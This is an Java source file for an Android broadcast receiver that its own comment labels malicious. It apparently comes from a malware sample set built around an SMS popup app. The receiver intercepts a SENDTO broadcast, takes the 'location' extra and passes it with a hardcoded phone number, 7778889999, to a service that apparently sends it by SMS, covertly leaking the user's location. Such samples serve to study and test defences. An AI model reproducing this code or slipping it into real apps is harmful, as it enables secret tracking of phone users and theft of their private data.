package net.everythingandroid.smspopup.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import net.everythingandroid.smspopup.service.AnotherMaliciousSendSmsService;

public class AnotherMaliciousSmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        // [Malicious] theft SENDTO broadcast and change recipient number
        String location = intent.getStringExtra("location");

        Intent modifiedIntent = new Intent(context, AnotherMaliciousSendSmsService.class);
        modifiedIntent.putExtra("number", "7778889999");
        modifiedIntent.putExtra("location", location);
        context.startService(modifiedIntent);
    }
}